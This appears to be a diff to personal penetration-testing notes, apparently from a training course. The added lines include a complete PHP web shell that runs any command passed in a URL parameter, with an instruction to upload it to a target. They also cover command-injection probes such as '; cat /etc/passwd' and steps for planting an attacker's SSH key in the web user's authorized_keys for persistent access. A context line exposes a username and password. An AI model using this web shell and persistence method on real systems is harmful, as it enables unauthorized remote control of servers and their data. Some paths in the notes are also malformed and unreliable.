@@ -116,6 +116,22 @@ Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER7
         #need to be able to find the upload
     #if you cannot upload the web shell move on it work work
         #if there is no uploads page who the fuck cares
+  
+  #Upload this as a php
+  
+  <HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
 
 #Once we have creds log into device
     #first thing when on the box
@@ -278,7 +294,55 @@ print s.recv(1024)                  #Print Response
 s.close()                           #closes the socket
 
 
-#Other ways to exploit windows
+#More Web Exploitation
+#Command Injection
+    ; whoami
+        #how to test if vulnerable to it
+            #if is the just ; <command>
+        #can do ssh key upload through this
+#SSH Key Upload
+    #Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system
+        #with that we can gain access without the need of a password
+    #Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
+        ssh-keygen -t rsa
+    #After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
+        cat ~/.ssh/id_rsa.pub
+    #On the target website we need to do some tasks in order to upload our ssh properly
+        #These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
+        whoami
+            #Once the user is known find this users home folder by looking in /etc/passwd
+            ; cat /etc/passwd
+            #We also want to make sure the user has a login shell
+        www-data:x:33:33:www-data:/var/www:/bin/bash
+        #Check to see if .ssh folder is in the users home directory. If not make it
+            ls -la /users/home/directory      #check if .ssh exists
+                ls -la /var/www:
+            mkdir /users/home/directory/.ssh  #make .ssh in users home folder if it does not exist
+                mkdir /var/www:/.ssh
+        #Echo ssh key to the authorized_keys file in the users .ssh folder
+            echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+                echo "the shit" >> /var/www:/.ssh/authorized_keys
+        #Verify key has been uploaded successfully
+            cat /users/home/directory/.ssh/authorized_keys
+              cat /var/www:/.ssh/authorized_keys
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
